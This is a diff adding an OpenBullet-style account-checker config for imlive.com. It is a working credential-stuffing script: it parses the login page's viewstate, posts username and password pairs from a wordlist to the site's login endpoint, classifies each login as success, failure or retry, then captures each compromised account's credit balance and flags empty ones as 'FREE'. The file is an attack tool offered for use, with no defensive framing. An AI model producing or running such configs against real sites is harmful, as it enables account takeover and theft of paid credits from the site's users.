@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "ImLive",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-30T12:07:25.8656762+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://imlive.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_VIEWSTATE PARSE "<SOURCE>" CSS "[name=viewstate]" "value" 0 -> VAR "VIEWSTATE" "" "" 
+#POST_LOGIN REQUEST POST "https://imlive.com/services/guestlogin.ashx?action=login" AutoRedirect=TRUE 
+  CONTENT "firstlastName=&txtUsername=<USER>&txtPassword=<PASS>&viewstate=<VIEWSTATE>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  COOKIE "Cookie: ASP.NET_SessionId=efskpacxmnogw4w1uwfsqb5w; BIGipServerImlive=2769552962.20480.0000; EventLogger=05074FC3-23F3-45E3-A653-E68C18DB9E34; __utma=71081352.2073103187.1532950673.1532950673.1532950673.1; __utmc=71081352; __utmz=71081352.1532950673.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmv=71081352.|1=Member%20Type=Anonymous=1^2=Guest%20Identifier=0=1; __utmt=1; __utmt_UA-8245164-1=1; spvdr=vd=78f91d84-81d6-44ef-9c36-57ad3072a007&tid=0&sgid=0&warAgree=yes&vi=abd82adb; imlv=Gi%2f2gOYmuvqgDiI5FNamave0M6qOP%2bY5Dg6%2ftVP85HJrDU%2foZA5%2bUgdToTzjJF6oGppotyrCioXzmM4TrP3Hpc2EXKv1hgKKv%2bbxXtCDq9mHRUEJ2nRNJsalIHaHdEyP%2bwBtAZRKL8X2EvbRDrHhSl6EOhW2aGoEPObDmfjE%2fzE%3d; dtSa=-; dtLatC=2; __utmb=71081352.21.10.1532950673; dtCookie=9014660CC18C10C81C5AA44C74DB8489|SW1MaXZlfDE; dtPC=551235988_847h4" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://imlive.com/webcam-sign-up/" 
+  HEADER "Origin: https://imlive.com" 
+  HEADER "Host: imlive.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":0,\"" 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":1,\"" 
+  KEYCHAIN Retry OR 
+    KEY "Oops, we encountered an incident." 
+REQUEST GET "https://imlive.com/members.aspx" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "\"myBalance\">" "<" Recursive=FALSE -> CAP "Credits" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Credits: 0.00" 
